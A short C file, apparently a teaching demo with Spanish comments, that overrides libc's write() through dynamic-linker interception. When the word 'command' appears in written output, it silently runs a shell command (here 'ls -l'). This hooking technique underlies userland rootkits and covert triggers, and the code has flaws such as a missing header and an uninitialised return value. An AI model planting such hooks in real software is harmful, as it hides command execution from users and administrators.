#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>

ssize_t write(int fildes, const void *buf, size_t nbytes) {
  // Puntera a  la  funcion   _write_
  ssize_t (*new_write)(int fildes, const void *buf, size_t nbytes);
  ssize_t result;
  //  Optenemos la direcion de  la  funcion  _write_ origina 
  new_write = (ssize_t(*)(int, const void *, size_t))dlsym(RTLD_NEXT, "write");

  // Buscar la palabra "command" en el buffer
  if (strstr((const char*)buf, "command") != NULL) { 
    // result = nbytes;
    char *args[] = {"/bin/bash", "-c", "ls -l", NULL};
    execvp(args[0],args);
  } else {
    result = new_write(fildes, buf, nbytes);
  }
  return result;
}
